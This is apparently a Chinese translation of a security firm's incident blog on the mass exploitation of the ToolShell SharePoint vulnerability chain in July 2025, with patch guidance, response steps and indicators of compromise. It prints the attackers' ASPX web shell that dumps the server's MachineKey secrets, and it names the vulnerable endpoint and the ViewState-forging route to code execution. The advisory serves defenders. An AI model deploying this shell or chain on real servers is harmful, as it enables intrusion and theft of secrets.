> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzNDIzNDUxOQ==&mid=2247500946&idx=3&sn=c5bbf571b7151ad4830b959d09210954

#  SharePoint 服务器漏洞正遭受大规模利用  
 独眼情报   2025-07-20 05:16  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KgxDGkACWnSuwceI6cDbauDw4p2LibLzicHxSuiaxia5Q4yj6CU22o84mTWcIvDHlRWWseLGo0ngXr2s7sM7uSo68A/640?wx_fmt=jpeg&from=appmsg "")  
## 概述  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSuwceI6cDbauDw4p2LibLzicDKpHyX5sLGiaP8ZyVx5okW57G80U89qYlc4Ab74Njgb66gxK7EpMicicQ/640?wx_fmt=png&from=appmsg "")  
  
在**2025年7月18日**  
晚上，Eye Security发现了一个**新的SharePoint远程代码执行(RCE)漏洞链**  
的大规模主动利用，这个漏洞链被称为ToolShell。这个漏洞刚刚在几天前被CODE WHITE GmbH在X上展示过（Pwn2Own Berlin 2025的原作者在补丁发布后公开分享），现在这个漏洞已经被武器化，正在被用来攻击全世界的本地部署SharePoint服务器。  
  
我们的团队扫描了**全球超过1000多台SharePoint服务器**  
。我们发现**数十台系统已被主动攻陷**  
，很可能是在7月18日下午18:00（中欧时间）左右。这篇博客将分享我们的初步发现和建议，告诉大家如何打补丁以及如何进行入侵评估（如果你觉得自己可能受到了影响）。  
## 博客更新日志  
  
由于这个事件还在持续发展中，我们会在这篇博客中更新相关的新信息。  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">时间</span></strong></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">事件</span></strong></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">2025年7月19日周六 ~ 04:00 中欧时间</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">博客发布</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">2025年7月19日周六 ~ 08:00 中欧时间</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">更正Pwn2Own Berlin是在25年5月举行的</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">2025年7月19日周六 ~ 19:00 中欧时间</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">添加了第二波大规模利用所使用的IPv4地址</span></section></td></tr></tbody></table>  
### 关于披露的说明  
  
这篇博客遵循了对受影响组织及其国家GovCERT的**负责任披露**  
原则。在每个确认的案例中，我们都直接联系了相关方并提供了详细证据（包括受影响的确切SharePoint URL）。我们的首要目标很明确：保护整个生态系统。因此，在组织恢复期间，我们会在这篇博客中隐藏一些细节。我们永远不会分享受害者信息。  
## 2025年7月18日晚上  
  
深夜时分，我们的24/7检测团队从某个特定客户的**CrowdStrike Falcon EDR**  
部署中收到了一个警报。这个警报标记了在一台老旧的SharePoint本地服务器上的可疑进程链，与最近上传的恶意
```
.aspx
```

  
文件有关。  
  
乍一看，这很眼熟。一个经典的网页木马，混淆代码在自定义路径中，设计用来通过HTTP进行远程命令执行。我们之前见过很多这样的。但这次让它显得特别的是，它是怎么  
到那里的。  
  
我们最初的假设很平常但很有道理：对**联合ADFS身份**  
进行暴力破解或凭证填充攻击，然后使用有效凭证进行身份验证上传或远程代码尝试。受影响的SharePoint服务器暴露在互联网上，并通过混合ADFS连接到Azure AD。当配置错误或过时时，这个技术栈可能是个危险的组合。  
  
这一切似乎都证实了这个理论：凭证被盗 → 木马投放 → 实现持久化。  
  
但后来，有些东西不对劲。  
- 我们在ADFS日志中没有找到成功的身份验证记录，或者至少日志记录不充分  
  
- 恶意IIS日志在
```
cs-username
```

  
列中没有包含值，这很奇怪  
  
- 对
```
/_layouts/15/ToolPane.aspx
```

  
的POST请求看起来相当特殊  
…  
  
- 我们感觉凭证从来没有  
被使用过…  
  
攻击者怎么能在**完全没有身份验证**  
的情况下向服务器写入文件呢？  
## ToolShell (CVE-2025-49706 & CVE-2025-49704)  
  
就在这时我们意识到，我们处理的不再是一个简单的基于凭证的入侵。 这不是暴力破解或钓鱼场景。**这是零日漏洞领域的事情。**  
  
经过一些调查，我们了解到三天前，**Code White GmbH**  
的攻击安全团队展示了他们可以重现SharePoint中的未经身份验证的RCE利用链，这是今年5月在Pwn2Own Berlin上展示的两个漏洞的组合：  
- CVE-2025-49706  
  
- CVE-2025-49704  
  
他们将这个链称为**ToolShell**  
。  
  
当时，这被认为是一个概念验证。没有公开代码发布，细节也很稀少。但时间匹配。行为也匹配：
```
/_layouts/15/ToolPane.aspx
```

  
中的漏洞，文件写入，无需登录，完全控制Web应用程序进程。  
  
这不是凭证问题。这是一个已经在野外使用的武器化Pwn2Own漏洞。  
## ASPX载荷：转储加密密钥  
  
当我们的团队开始审查受影响的系统时，我们预期会找到常见的嫌疑对象：用于命令执行、文件上传或横向移动的标准网页木马。相反，我们发现的更微妙，可以说更危险：一个隐秘的
```
.aspx
```

  
文件，其唯一目的是通过简单的GET请求从SharePoint服务器中提取和泄露加密秘密。  

```
<%@ Import Namespace=&#34;System.Diagnostics&#34; %>
<%@ Import Namespace=&#34;System.IO&#34; %>
<script runat=&#34;server&#34; language=&#34;c#&#34; CODEPAGE=&#34;65001&#34;>
    public void Page_load()
    {
  var sy = System.Reflection.Assembly.Load(&#34;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&#34;);
        var mkt = sy.GetType(&#34;System.Web.Configuration.MachineKeySection&#34;);
        var gac = mkt.GetMethod(&#34;GetApplicationConfig&#34;, System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
        var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
        Response.Write(cg.ValidationKey+&#34;|&#34;+cg.Validation+&#34;|&#34;+cg.DecryptionKey+&#34;|&#34;+cg.Decryption+&#34;|&#34;+cg.CompatibilityMode);
    }
</script>

```

  
这不是你典型的网页木马。没有交互式命令、反向shell或命令控制逻辑。相反，这个页面调用内部.NET方法来读取SharePoint服务器的**MachineKey**  
配置，包括
```
ValidationKey
```

  
和
```
DecryptionKey
```

  
。这些密钥对于生成有效的
```
__VIEWSTATE
```

  
载荷至关重要，获得它们实际上**将任何经过身份验证的SharePoint请求转变为远程代码执行机会**  
。  
  
然后一切都联系起来了。  
## 通过CVE-2021-28474在SharePoint上实现RCE  
  
基于我们对CVE-2021-28474的了解，我们可以推断新的ToolShell CVE链是如何完成完整的远程代码执行(RCE)的：利用SharePoint通过
```
__VIEWSTATE
```

  
处理反序列化和控件渲染的方式。  
  
在原始的CVE-2021-28474中，攻击者滥用SharePoint页面中的服务器端控件解析逻辑，将意外对象注入页面生命周期。这是可能的，因为SharePoint使用存储在机器配置中的签名密钥（即
```
ValidationKey
```

  
）来加载和执行ASP.NET 
```
ViewState
```

  
对象。通过制作带有序列化载荷的恶意页面请求，并正确签名  
，攻击者可以导致SharePoint反序列化任意对象并执行嵌入的命令。然而，该漏洞受到生成有效签名要求的限制，这反过来需要访问服务器的秘密
```
ValidationKey
```

  
。  
  
现在，通过ToolShell链（CVE-2025-49706 + CVE-2025-49704），攻击者似乎可以**直接从内存或配置中提取ValidationKey**  
 。一旦这个加密材料被泄露，攻击者就可以制作完全有效、已签名的
```
__VIEWSTATE
```

  
载荷，绕过最后一道防线  
。这些载荷可以嵌入恶意小工具链（例如，用于命令执行），并被服务器作为可信输入接受，完成RCE链而无需凭证。这反映了2021年被利用的设计弱点，但现在打包成一个现代零日链，具有自动shell投放、完全持久化和零身份验证。  
  
本质上，攻击者将SharePoint对自己配置的信任转变为武器。  
## 我们的第一反应  
  
对于我们的客户，我们立即对SharePoint服务器和周围系统进行了全面扫描，确保没有其他网页木马或持久化机制存在。同时，我们直接通知了客户，将受影响的系统从网络中隔离，并激活了我们的事件响应协议。虽然完整的入侵评估仍在进行中，我们目前不会透露更多细节，但早期证据表明**攻击在成功之前就被阻止了，这要归功于我们EDR的及时干预**  
，它阻止了进一步的执行并防止了横向移动。  
  
在对所有客户进行一些搜索后，我们确认没有其他活跃的入侵，这让我们开始研究以通知其他潜在受害者。  
## 扫描互联网以通知受害者  
  
意识到我们很可能目睹了大规模利用活动的第一波，我们扩大了范围。使用内部遥测，我们扫描了超过**1000多个面向公众的SharePoint环境**  
。  
  
我们的目标很明确：确定这个漏洞是孤立的还是系统性的。答案来得既快又决定性：**它是系统性的**  
。在几小时内，我们识别出**数十台独立服务器被攻陷**  
，使用完全相同的载荷在相同的文件路径中。在每个案例中，攻击者都植入了一个泄露敏感密钥材料的shell，从而实现完全的远程访问。  
  
考虑到规模和严重性，我们迅速采取行动进行**私人披露**  
。我们编制了技术IOC、URL和入侵指标，并联系了**欧盟和国际上的多个国家CERT**  
。我们还在可能的情况下通知了相关的受影响组织，符合负责任披露准则。  
## 行动呼吁：检查你自己的SharePoint  
  
遵循Microsoft关于ZDI-25-580 / ZDI-CAN-27162 / CVE-2025-49706的官方建议。请注意，随着这个漏洞的发展，Microsoft可能会更新它。根据Microsoft的说法，受影响的构建是以下版本之前的任何**预补丁版本**  
：  
- **2016:**  
 16.0.5508.1000 (KB5002744) 之前  
  
- **2019:**  
 16.0.10417.20027 (KB5002741) 之前  
  
- **订阅版本:**  
 16.0.18526.20424 之前  
  
部署官方2025年7月安全更新：  
- 通过**Microsoft Update**  
、**Update Catalog**  
或**Media**  
可获得。  
  
- Microsoft明确声明**没有其他缓解措施或解决方案**  
：只有完整的补丁才能消除漏洞  
  
验证补丁是否在系统范围内安装：  
- 在你的SharePoint中央管理中 > "管理补丁状态" 或通过PowerShell。  
  
- 或者，交叉引用上面列出的已安装KB编号。  
  
扫描剩余的入侵指标(IOCs)：  
- 即使在打补丁后，被攻陷的服务器可能仍然托管后门。我们无法分享我们识别的后门文件名，但请确保扫描所有公共
```
_layouts/15/
```

  
目录以寻找植入的shell，审查HTTP访问日志（~18:00 CET，7月18日），并轮换任何可能被捕获的凭证、证书或令牌。  
  
## 向非技术人员解释的风险  
  
**ToolShell利用链**  
不仅仅是另一个远程代码执行漏洞：它对任何运行**本地SharePoint实例**  
且在某个时间点未打补丁的组织来说，都代表了明确和现实的危险。  
- **远程代码执行(RCE)**  
 ：使用ToolShell，攻击者可以在SharePoint服务器上执行任意代码而无需身份验证  
。这给了他们对底层Windows主机的完全控制，包括访问所有SharePoint内容、文件系统和内部配置。由于攻击是未经身份验证的，标准的身份或MFA保护无法提供防御。  
  
- **访问敏感密钥材料**  
：我们观察到的最令人担忧的行为之一是通过网页shell泄露内部加密密钥和秘密。有了这些，攻击者可以冒充用户或服务，即使在打补丁后也是如此。  
  
- **在打补丁后仍然存在的持久化**  
：在被攻陷后  
修补CVE-2025-49706和CVE-2025-49704为时已晚。一旦进入，攻击者可以安装辅助网页shell、创建新的计划任务、将后门注入合法的SharePoint DLL，或修改配置文件以无限期保留访问权限。其中一些方法可以在重启、软件更新，甚至AV扫描中存活。  
  
- **数据泄露和横向移动**  
：被攻陷的SharePoint服务器通常位于协作、文件存储和身份的交汇点。从这里，攻击者可以：  
  
- 转储敏感文档、客户数据、合同或内部策略。  
  
- 获取密码或缓存的凭证。  
  
- 横向移动到文件服务器、域控制器或数据库系统。  
  
- 利用SharePoint与Outlook、Teams或OneDrive的集成来冒充用户或透视到云端。  
  
这不是机会主义的撒网式恶意软件。这是**外科手术式利用**  
，在公开演示后72小时内就能看到，旨在规避检测并获得长期访问权限。你行动得越早，就越有可能控制损害。  
## 即时响应建议  
  
如果你确认自己被攻陷了，请立即采取行动。  
1. **隔离或关闭受影响的SharePoint服务器。**  
通过防火墙阻止是**不够的**  
，因为持久化可能已经存在。  
  
1. **审计所有可能通过SharePoint访问的凭证和令牌。**  
  
1. **联系你的事件响应团队或可信的网络安全公司。**  
时间至关重要。如果你需要支持，请咨询专业支持。  
  
## 入侵指标(IOCs)  
  
请与你的IT团队和/或MSP分享以下指标，让他们检查他们的日志。请注意，这个列表可能不完整，请定期查看CVE-2025-49706以获取更新。  
- 
```
107.191.58[.]76
```

  
 – 第一波利用基于美国的源IP，负责7月18日18:06中欧时间左右的主动利用  
  
- 
```
104.238.159[.]149
```

  
 – 第二波利用 基于美国的源IP，负责7月19日07:28中欧时间左右的主动利用  
  
- 
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
```

  
 – 7月18日和19日主动利用中使用的用户代理字符串  
  
- 
```
Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:120.0)+Gecko/20100101+Firefox/120.0
```

  
 – 用于IIS日志搜索的URL编码用户代理字符串  
  
- 对
```
/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
```

  
的POST请求 **–**  
 与CVE-2025-49706相关的被利用aspx文件路径  
  
- 对
```
/_layouts/15/<未披露-aspx-文件名>.aspx
```

  
中恶意ASPX文件的GET请求 – 与CVE-2021-28474相关的aspx加密转储器  
  
- <aspx shell哈希值将在我们通知的所有组织缓解威胁后分享>  
  
- <aspx shell文件名将在我们通知的所有组织缓解威胁后分享>  
  
  
  
  
